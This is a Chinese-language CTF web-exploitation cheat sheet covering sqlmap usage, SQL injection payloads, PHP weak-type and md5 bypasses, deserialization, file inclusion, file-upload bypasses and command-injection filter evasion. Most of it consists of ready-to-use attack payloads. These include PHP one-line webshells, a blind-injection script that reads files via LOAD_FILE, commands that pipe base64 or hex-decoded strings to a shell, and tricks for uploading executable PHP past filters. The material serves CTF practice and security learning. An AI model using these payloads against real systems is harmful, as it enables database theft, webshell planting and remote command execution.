        python sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 --batch -D sqli --tables
    查字段
        python2 sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 --batch -D sqli -T flag --columns
    4.查数据
        python sqlmap.py -u http://challenge-d20f8ccada64b868.sandbox.ctfhub.com:10080/?id=1 --batch -D sqli -T flag -C flag --dump

sqlmap -u "http://xxx" --batch
    
    之后写入同样的命令加参数
    -u URL
    --batch 自动测试，不提示
    --current-user
    --current-db
    --dump
    --os-shell
    --dbs   # 列出所有数据库
    -D tourdata --tables # 所有表
    -D tourdata -T userb --columns # 表字段
    sqlmap.py -r Filename.txt --dbs --level=3
    sqlmap -u http://x.x/show.php?id=35 --level=3 -D test --tables -C thekey --dump


使用http请求文件

    可以用burpsuite抓包并复制到txt文件（注意请用gedit编辑器，vim会因为格式问题报错）
    sqlmap -r 1.txt
    2.使用burpsuite log文件 （勾选上options中的Misc中的proxy）
    sqlmap -l log.txt

### 实战常用

```
检测有无dba权限可写入
sqlmap -u "<url>" --is-dba
```

### sql 堆叠注入

堆叠注入 [BUUCTF [SUCTF 2019]EasySQL](https://blog.csdn.net/qq_42158602/article/details/103930598), [WP2](https://www.cnblogs.com/chrysanthemum/p/11729891.html) `select $_GET['query'] || flag from flag`

    1;show databases#
    
    1';show databases;
    1';show tables;
    1';show columns from words;
    0';show columns from `1919810931114514`;#
    0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#
    1' or 1=1#
    flag{5a59e750-5531-4525-b39a-02edff259a48}

例2 [[GYCTF2020]Blacklist](https://www.cnblogs.com/gaonuoqi/p/12398554.html)
最后一步时使用 [Handler](https://dev.mysql.com/doc/refman/8.0/en/handler.html)

`preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);`
```sql
1';
HANDLER FlagHere OPEN;
HANDLER FlagHere READ FIRST;
HANDLER FlagHere CLOSE;#
-- FlagHere是表名
```
例3  __[强网杯 2019]随便注__
最后一步 先构造一个sql语句，然后执行它，payload转化成16进制绕过waf
```sql
1';
SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
prepare execsql from @a;
execute execsql;#
-- select * from `1919810931114514`
--- 方法2
1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#
```



在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，

mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat, 将||视为字符串的连接操作符而非或运算符

    1;set sql_mode=PIPES_AS_CONCAT;select 1
    非预期，没有过滤*直接注入*
    *,1

字符串或时前面的数字时结果为1则返回1，为0则返回0，效果跟直接*一样

![](./imgs/web-sql1.png)


2

    'or 1=1#             //
    1'order by 2#         //只有2字段。
    1'union select 1,2#         //返回一个正则过滤 return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
    想到堆叠注入，试一下，
    1';show tables;#            // 有我们要的字段
    
        array(1) {
          [0]=>
          string(16) "1919810931114514"
        }
    0'; show columns from words ;#



### sql 盲注

__知识点__

页面只返回True（密码错误）或False（用户名错误），考察SQL盲注。

解题步骤 http://web.jarvisoj.com:32787/login.php

    admin                       //尝试admin提示密码错误，其他用户名均提示用户名错误
    'or 1=1#                    //提示用户名错误，过滤了空格或or
    'or/**/1=1#                 //提示密码错误，确定过滤了空格
    'or/**/ascii(substr(database(),1,1))>1#     //提示密码错误，可以开始爆破了
    [BJDCTF 2nd]简单注入
       select * from users where username='admin\' and password='123456#';
       select * from users where username='admin and password=' 恶意代码 #';
       post --- username=admin\ password=^(ascii(substr(password,1,1))>1000)#
    
    使用username=admin’#&password=123456,页面返回密码错误，说明后台没有对#和’进行过滤。
    使用username=admin’ or 1=1#&password=123456，页面返回用户名错误，上面后台对admin’ or 1=1#中的部分内容进行了过滤。过滤的内容有可能是or也有可能是空格。
    使用username=user’//or//1=1#&password=123456，页面返回密码错误，说明输入的SQL语句能够被执行，这也表明后台仅仅是过滤了空格。
    总结，username存在sql注入，同时仅仅只是过滤了空格，那么就是一个盲注了
    
    整个PoC就是一个基于错误的盲注的步骤了，具体的方法可以参考文章。
    
    查找表，username=user’//or//exists(select////from/*/admin)#&password=123456,页面返回密码错误，那么就说明在数据库中存在admin表
    查找字段username=user’//or//exists(select//username,password//from/**/admin)#&password=123456，页面返回密码错误，说明在admin表中存在username和password字段。
    username=user’//or//exists(select//count()//from/*/admin)#&password=123456，页面返回密码错误，说明在admin表中仅仅只存在一条记录，接下来就好办了
    得到password长度，username=user’//or//(select//length(password)//from/**/admin)>10#&password=123456，通过二分试探法，最终发现password的字段长度是32位，说明可能采用的是md5的方式来进行加密的。
    在确定了password的长度之后，接下来就是利用Python来进行爆破了。
    
    username=user'/**/or/**/exists(select/**/username,password/**/from/**/admin)#&password=123456

方法2, 
username=any'/**/union/**/select/**/'c4ca4238a0b923820dcc509a6f75849b'#&password=1

    # c4ca4238a0b923820dcc509a6f75849b 是 1 的md5 (password=1所以用1)
    # username 随意写

### 实例
[[SWPU2019]Web1](https://www.jianshu.com/p/dc9af4ca2d06)

尝试 `-1' select 1,2,3'` 提示 `select1,2,3 limit 0,1 at line 1`

复原语句 `select * from ads where title = '$title' limit 0,1;`

payload替换$title, 再将空格替换为`/**/`:
    
    -1'union select/**/1,(
        select/**/group_concat(b)/**/from(
            select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users
        )as/**/x
    ),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

解析

    select 1,2 as a,3 as b union select * from users ， users有3列，用a代表2列 b代表3列一会儿进行group by, 就能控制2 3列了
    select group_concat(b) from(select 1,2 as a,3 as b union select * from users)as x, 再group concat b把users的第3列即flag列 连接起来
    再组合上去，由系统查出2，3列得到flag
    
    as x 也需要，Every derived table must have its own alias



### 常用语句

where id = 1 and 1=1

where id = 1 and 1=2

1有结果，2没结果，上面两句确定数据库是否执行。

select * from user where id = 1 and 1=1 union select flag from flag, union需要前后列一样。

使用orderby 看几次没结果确定列数。

    union select 1,2,3          ---是列数
    http://192.168.100.111/web/web15/?id=1 Order by 3  , 确定了是3列。
    http://192.168.100.111/web/web15/?id=1 Order by 4  , 没有结果。
    
    前面没结果时显示后面的结果。用-1 或者 and 1=2
    http://192.168.100.111/web/web15/?id=-1 Union Select 1,2,3
    http://192.168.100.111/web/web15/?id=-1 Union Select database(),2,3     --查询库名
    http://192.168.100.111/web/web15/?id=-1 Union Select database(),user(),3     --查询用户名
    http://192.168.100.111/web/web15/?id=-1 Union Select database(),user(),version()     --查询数据库版本
    http://192.168.100.111/web/web15/?id=-1 Union Select database(),user(),version()     --查询数据库版本
    INFORMATION_SCHEMA 数据库保存 库，表的信息。
      SCHEMATA 库名
      TABLES  有两列，一列所有库，二列所有库的所有表。
      COLUMNS 全部库的表的列
    
    --有问题 http://192.168.100.111/web/web15/?id=-1 Union Select TABLE_NAME,2,3 where table_schema = database()     --查询数据库表名
    --有问题 http://192.168.100.111/web/web15/?id=-1 UNION SELECT TABLE_NAME,2,3 FROM INFORMATION_SCHEMA WHERE TABLE_SCHEMA = DATABASE() 

### sql md5 加密注入
方法1 

ffifdyop 撞

`抓包的 Response Hint: "select * from `admin` where password='".md5($pass,true)."'"`

* 根据此题中的password的语句：`select * form admin where password=''`
进行password的绕过，需将此语句填充为：`select * form admin where password=''or 1`，又因为此题有md5加密，并转换为字符串，所以根据前人，大师傅们的总结，有：

    字符串：`ffifdyop`

    md5加密后：`276f722736c95d99e921722cf9ed621c` => hex2ascii: 'or'6??????

    而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是

        select * from 'admin' where password='' or '6xxxxx'

方法2

Google 了一下 `sql injection php md5`，发现了有趣的东西，下面就放一个串就好。

    password: 129581926211651571912466741651878684928
    
    raw: ?T0D??o#??'or'8.N=?

### 扩展MySQL函数------ UDF

udf是mysql自定义函数包，

udf.so用于linux系统，udf.dll用于windows系统。

有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，使用者自行添加的MySQL函数就称为UDF(User Define Function)。

做法就是

    $ mysql
    > select @@plugin_dir;
得到插件的目录，将 udf.so 拷贝过去，然后再

    $ mysql
    > create function getflag returns string soname 'udf.so';
    > select help_me();
    > select getflag();



### 知识点

反引号可可以注入``

### SQL约束攻击
  字符串末尾的空格符将会被删除。换句话说"vampire"等同于"vampire "，构造"admin   "作为admin登录
### Fuzz

```php
preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```
### 注入测试 

%20就是空格

测试
    
    http://web.jarvisoj.com:32794/index.php?table=test` `union select 1 limit 1,1

数据库名

    http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1

表名
    
    http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1
    # 得到所有表名 secret_flag,secret_test

列名

    http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1

flag
    
    http://web.jarvisoj.com:32794/index.php?table=test` `union select flagUwillNeverKnow from secret_flag limit 1,1

### Scripts
#### sql_loadfile

```python
url = "http://eci-2zeedsjzsv7gv015g3i4.cloudeci1.ichunqiu.com:80/?id='%20union%20selecSELECTt%201%20%2c2%20WHwhereERE%201%3d1%20"
payload = "and ascii(substr(convert(( LOAD_FILE( '/flag')) using utf8) ,%s,1))>%s # "
flag = ''
for i in range(1, 128):
    max = 126
    min = 33 
    while abs(max-min) > 1:
        mid = int((max+min)/2)
        p = payload % (str(i), str(mid))
        p=urllib.parse.quote(p)
        response = requests.get(url + p)
        str_response= str(response.content, encoding = "utf-8")
        if str_response.find("GET me password") != -1:
            min = mid
        else:
            max = mid
    flag = flag+chr(max)
```
# PHP
## 环境配置

PHP加入path变量。

cd 项目目录
php -S localhost:80

命令行执行
```php
php -r "print_r(get_defined_constants());"
php -r "print_r(escapeshellarg('123'));"
php -f  "my_script.php"
php -r "eval("system('dir')");"
php -r "echo 123;"
$ some_application | some_filter | php | sort -u >final_output.txt
```
## php 基础, 弱类型, md5
1. 弱类型比较

        旧版本的　PHP,  "1b" == 1 -> true，弱类型字符串直接会转数字，去掉后面的b
        == 非严格比较， 先类型转换再比较
        === 会进行类型比较 "1b" === 1 -> false
    
        同时满足 $a==0 和 $a  ------  a=abc
    
        同时 !is_numeric($b) 和 $b>1234 ------ b=1234a
        is_numeric()函数用1234567a绕
        
        2. 值不一样结果要一样, md5 hash缺陷 0e开头弱类型
    
        第一个字符转数字
        var_dump("admin"==0);  //true  0==0
        var_dump("1admin"==1); //true  1==1
        var_dump("admin1"==1) //false  0==1
        var_dump("admin1"==0) //true   0==1

md5 0e绕过
        QNKCDZO
        0e830400451993494058024219903391
         
        s878926199a
        0e545993274517709034328855841020
          
        s155964671a
        0e342768416822451524974117254469


双md5弱相等  $md5==md5($md5)) 
    
    0e215962017

md5 数组绕过

    var_dump(md5($_GET['a']) == md5($_GET['b']))
        绕过 md5($id) === md5($gg), 通过传入数组会返回NULL
        v1[]=aaa&v2[]=bbb&v3=[]=1

md5强类型绕过

    2019 安洵杯Web easy_web
    
    if((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b']))
    a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
    &b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
    
    其他两组
    $Param1="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
    $Param2="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
    
    $data1="\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70";
    $data2="\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70";

[[极客大挑战 2020]Greatphp](https://blog.csdn.net/fmyyy1/article/details/117162062)
md5强类型绕过2
   Error类绕过md5和sha1
```php
$c = new Error($shell,1);$d = new Error($shell,2);
echo md5($a) === md5($b);
```

3. 空数组

        var dump(strcmp("aaa","flag"));  -->-1
        var dump(strcmp("flag","flag")); -->0
        var_dump(strcmp(array("aaa"),"flag"))
        v1=s878926199a&v2=s155964671a&v3=[]=1
        v1[]=aaa&v2[]=bbb&v3=[]=1

4. sha1加密相同 -传空数组

    遇数组返回 null
    
    v1[]=aaa&v2[]=bbb


        1.字符串与整数比较时会进行类型转换
        2.MD5 0e开头的哈希值
        3.MD5函数传入数组返回结果为NULL
        4.SHA1哈希函数传入数组返回结果为NULL
        5.strcmp函数传入数组返回结果为NULL

5. 调用函数的两种方式
```php
call_user_function(func1, param1)
func1(param1)
```

6. 常用序列化 serialize
```php
<?php

class Test {
    public $func;
    public $p;
}

$a = new Test();
$a -> func = 'system';
$a -> p = 'cat /flag';
echo serialize($a);
```
7. `#### =>,->`的意思

->是对象执行方法或取得属性用的。

=>是数组里键和值对应用的。

*  => 的用法
数组中用copy于数组的 key 和 value之间的关系

        $a = array('0' => '1', '2' => '4', );
        echo $a['0'];
        echo $a['2'];

* -> 的用法

类中用于引用类实例的方法和属性

    class Test{
        function add(){return $this->var++;}
        var $var = 0;
    }
    $a = new Test; //实例化对象名称
    echo $a->add();
    echo $a->var;
## 字符串解析特性

[Link](https://www.freebuf.com/articles/web/213359.html)

解析时： 1.删除空白符 2.将某些字符转为下划线（包括空格）

![](imgs/php_parse1.png)
![](imgs/php_parse2.png)
## 序列化 Serialize
https://www.php.net/manual/zh/function.serialize.php

    <?php
        class Shield {...}
    
        $shield = new Shield('pctf.php');
        echo serialize($shield);
    ?>

### Serialize
[[安洵杯 2019]easy_serialize_php](https://blog.csdn.net/qq_43622442/article/details/106003691)
https://blog.csdn.net/qq_45555226/article/details/109808474

### phpinfo 审计代码反序列化 unserialize
魔术方法

unserialize => __wakeup()
```
__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get()    用于从不可访问的属性读取数据
#难以访问包括：（1）私有属性，（2）没有初始化的属性
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__construct   当一个对象创建时被调用，
```

https://blog.csdn.net/bmth666/article/details/104737025
反序列化 + error类 https://blog.csdn.net/fmyyy1/article/details/117162062

* 序列化字符串中的+

> 在数字前可以使用+表示正数，并url编码%2b(否则识别为空格)

####  `[网鼎杯 2020 青龙组]AreUSerialz`

protected权限的变量在序列化的时会有%00*%00字符，利用php7.1+版本对属性类型不敏感，改为public进行绕过即可



问题在

    ini_set('session.serialize_handler', 'php');#ini_set设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。

`session.serialize_handler` 容易想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》。通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了session的反序列化问题。

<div style="color:red">php大于5.5.4的版本中默认使用php_serialize规则</div>

由phpinfo()页面继续可知，session.upload_progress.enabled为On。

当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。

但是，这时就有一个问题，在题目代码中，没有某个值是用来接受我们传入的数据，并储存到$_SESSION中的。

其实我们是有办法传入$_SESSION数据的，这里就利用到了|的反序列化问题

思路很明显了，我们需要构造一个上传和post同时进行的情况，代码如下:

    <!DOCTYPE html>
    <html>
    <head>
        <title>test XXE</title>
        <meta charset="utf-8">
    </head>
    <body>
        <form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"><!--     
    不对字符编码-->
            <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
            <input type="file" name="file" />
            <input type="submit" value="go" />
        </form>
    </body>
    </html>

注意enctype属性:

|  表头   | 表头  |
|  ----  | ----  |
| application/x-www-form-urlencoded  | 在发送前编码所有字符（默认） |
| multipart/form-data  | 不对字符编码。 在使用包含文件上传控件的表单时，必须使用该值|
| text/plain  | 空格转换为"+"加号，但不对特殊字符编码。 |

Code,在本机PHP环境执行下，得到反序列化结果。
    
    <?php
    class OowoO
    {
        public $mdzz='xxxxx';
    }
    $obj = new OowoO();
    echo serialize($obj);
    # O:5:"OowoO":1:{s:4:"mdzz";s:5:"xxxxx";}

payloay1:将xxxxx替换为`print_r(scandir(dirname(__FILE__)));`,得到序列化结果：

    O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}

为防止转义，在引号:前加上\。利用前面的html页面随便上传一个东西，抓包，把filename改为如下：

    |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}

注意，前面有一个`|`，这是session的格式。
![注意，前面](./imgs/web1.jpg)

接下来就是去读取 `Here_1s_7he_fl4g_buT_You_Cannot_see.php`

由phpinfo可知当前的路径为`/opt/lampp/htdocs/`

![注意，前面](./imgs/web2.jpg)

将xxx处改为：

`print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));`

之后步骤如前，将filename改为：

`|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}`

得到flag：

`CTF{4d96e37f4be998c50aa586de4ada354a}`


#### `[MRCTF2020]Ezpop` pop链
https://blog.csdn.net/weixin_43952190/article/details/106016260
## 文件包含 LFI

CTFhub文件包含

    GET: ?file=shell.txt
    POST: ctfhub=system('ls /');

远程文件包含

    用file包含phpinfo是有回显的，所以构造payload ：
    GET: xxx:10080/?file=php://input
    POST: <?php system('ls');?>


## php 文件上传
```
js
PHP
Php
php::$DATA
php
php.
php. .
php3
php4
php5
php%00.jpg
MIME
特殊 image/jpg + 'php ' + 'Multipart/form-data'  , 云waf会过滤multipart，用大写能过
```

0x1 无验证: 一句话木马 `<?php @eval($_POST['cmd']) ?>`

0x2 前端验证: bp抓包修改1.php.jpg 为 1.php

0x3 .htaccess: 

    未过滤.htaccess后缀，故此处也可上传.htaccess文件进行绕过。
    注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All
    
    1.上传.htaccess
    .htaccess
        AddType application/x-httpd-php .jpg
    2. 上传一句话木马

0x4 MIME绕过: 
    
    bp抓包 修改 Content-Type: application/octet-stream 为 
    Content-Type: image/jpg


0x5 00截断:
    
    上传 "shell.php.jpg"，bp抓包
    POST /?road=/var/www/html/upload/ HTTP/1.1 ==>改为
    POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1

0x6 双写后缀:
    
    上传 "shell.php"，bp抓包
    修改 filename="shell.php" => filename="shell.pphphp"

0x7 文件头检查:
    
    1. GIF89a<?php @eval($_POST['cmd']);?> 更改后缀名
    2. copy 1.gif/b+1.php/a sh.php 
    2.上传sh.php 抓包
    3.修改mime上传

0x8 过图片, gif 抓包后改gif为 .phtml结尾, 蚁剑连接

### Upload Labs
#### __0x03黑名单绕过__ .php .phtml .phps .php5 .pht .jpg
不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他任意后缀。比如说:.phtml .phps .php5 .pht，但如果上传的是.php5这种类型文件的话，如果想要被当成php执行的话，需要有个前提条件，即Apache的httpd.conf有如下配置代码

    AddType application/x-httpd-php .php .phtml .phps .php5 .pht .jpg

* 0x9 文件名后缀名绕过

绕过方法

    * 找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类

#### __Pass-04 .htaccess__
#### __Pass-05 大小写绕过__

    比如 aSp, Php pHp, 没有将文件名统一转成小写，故可以通过大小写绕过
    
    用burp将后缀改为大写PHP即可

能被解析的文件扩展名列表：
```
jsp jspx jspf
asp asa cer aspx
php php2 php3 php4 php5 php6 phtml pht
exe exee
```
#### __Pass-06 空格绕过__

可以看到，相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过

Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点

此处会删除末尾的点，但是没有去掉末尾的空格，因此bp上传一个.php[空格]文件即可

修改文件后缀为1.php .这种形式，从代码执行流程分析来看，会先去除文件名末尾的.,去除之后的文件后缀是 .php[空格]，利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格和.,达到上传.php的目的。

#### __Pass-07 点绕过__

从代码上看，可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。

__Pass-09 点空格点绕过__

可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。故可以构造点空格点进行绕过，也就是后缀名改为xx.php. .，也是利用了Windows的特性。
也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。

绕过方法
将后缀名改为xx.php. .即可

* __配合文件包含漏洞__

前提：校验规则只校验php文件内容是否是木马

绕过方式：

>* 先上传一个php文件内容是<?php include("123.txt");?>
>* 再上传一个123.txt文件内容是木马, 用上面的文件包含即可

* __配置操作系统文件命名规则__


上传不符合 Windows 文件命名规则的文件名

```
test.asp,
test.asp(空格)
test.php:1.png
test.php::$DATA
test.php::$DATA.....
```

会被 Windows系统自动去掉不符合规则符号后面的内容

后缀名大小写，可以尝试上传 Php, pHp 这样格式的后缀

__上传漏洞防御__

* 白名单防御
* 参考dvwa最高级别

## php 执行绕过
### 未过滤 ()~直接用取反绕过
~x = -(x+1)

取反绕过 - 第五空间智能安全大赛 WEB hate-php

PHP7开始可以用('phpinfo')();这种方式来执行函数

```php
<?php
$str = ~"phpinfo";
echo urlencode($str);
```
payload
```php
phpinfo() == (~%8F%97%8F%96%91%99%90)()
?code=(~%8C%86%8C%8B%9A%92)(~%93%8C);  // system('ls')
?code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F); // system('cat /flag')
?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6); // assert((eval($_POST[mochu7])))
```

### 绕过弱类型

key == "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3", ==为弱类型即 key=123即可

### 绕过字母/数字
```php
chr(97)
// 只有参数是数字,base才有效, 默认10,8进制定义为前置0, 16进制前置0x
echo intval(42);                      // 42
echo intval(4.2);                     // 4
echo intval('42');                    // 42
echo intval('+42');                   // 42
echo intval('-42');                   // -42
echo intval(042);                     // 34  4*8+2
echo intval('042');                   // 42
echo intval(1e10);                    // 1410065408
echo intval('1e10');                  // 1
echo intval(0x1A);                    // 26
echo intval(42000000);                // 42000000
echo intval(420000000000000000000);   // 0
echo intval('420000000000000000000'); // 2147483647
echo intval(42, 8);                   // 42
echo intval('42', 8);                 // 34
echo intval(array());                 // 0
echo intval(array('foo', 'bar'));     // 1
echo intval('ad123'); //0 可能返回0，取决最左字符

(intval($num) < 2020 && intval($num + 1) > 2021)  => 
    1.?num=0x2021
    2.?num=1e10 , '1e10'=1,  $a+1转数字 10000000001

intval($key)<1 && intval($key1=1)
    1、$key1=0.99999999999999999999（输入一大串9，不行继续输）
    2、$key1=0x1（16进制表示，intval(0x1)后得到为0）
```

## 各类绕过 RCE/Bypass 汇总
scripts/php_fuzz.py
[浅谈CTF中命令执行与绕过的小技巧](https://www.freebuf.com/articles/web/137923.html)

### 过滤空格

```
$IFS,${IFS},$IFS$9,<,<>,{cat,flag.php}
%20 (space)
%09 (tab)
X=$'cat\x09./flag.php';$X （\x09表示tab，也可以用\x20）

127.0.0.1 &echo "<?php @eval(\$_POST['a']);?>" >> shell.php

过滤"ping -c 4 {$_GET['ip']}"
    =>|ls, |cat flag.php, 看源码,
    注意: 使用| 这不是连续执行, 只能一级传一级,要连续就用127.0.0.1;ls
```

### 命令分隔符

连续执行 `& && ｜ || ;` 

linux中：`%0a %0d ; & | && ||`

windows中：`%0a & && | || %1a`

注意%0a要在地址栏输入，否则会2次编码

### base64与管道符, hex, oct, printf
```
echo d2hvYW1p | base64 -d | sh ################## whoami
echo "77686F616D69" | xxd -r -p|bash ############ -- run whoami
printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67" #### oct 8进制 $cat /flag
```
### 单引号、反斜杠、反引号
```
cat f''ag.txt
ca''t flag.txt
ca\t fla\g.txt
cat `ls`   用反引号
```
### 过滤cat

```
1=>ca\t flag.php
2=>ca''t fla''g.txt
3=>127.0.0.1&ca\t flag_5882926228560.php | base64
3.用其他cat,tac,more,less,head,tail,nl,tailf,
     win: type, more, copy file1 + file2 + file3 con >nul
```

### 命令注入绕过 RCE

        过滤/ preg_match_all("/\//", $ip, $m)
            1=>${PATH:0:1}=>|cat flag_is_here${PATH:0:1}flag_28512274183473.php
            2=>先cd目录再cat=>127.0.0.1;cd flag_is_here;cat flag_28512274183473.php;
            3=>127.0.0.1;cd flag_is_here;cat `ls`;
        过滤 preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/"
            1.1=>127.0.0.1%0als
            使用通配符绕过
            1.2=>127.0.0.1%0acd${IFS}f*_is_here%0als
            1.3=>127.0.0.1%0acd${IFS}f*_is_here%0amore${IFS}f*_12646135912113.php
            2.1=>16进制=>?ip=127.0.0.1%0als${IFS}$(printf${IFS}"\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65")
            2.2=>16进制=>?ip=127.0.0.1%0aca''t${IFS}$(printf${IFS}"\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65\x2f\x66\x6c\x61\x67\x5f\x36\x33\x31\x38\x31\x35\x30\x35\x33\x33\x34\x2e\x70\x68\x70")#
    
        过滤 preg_match('/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i',$code)), $blacklist = get_defined_functions()['internal'];
            取反绕过
    
        isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
            需要让$text输入 ”welcome to the zjctf“ 
            ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
    
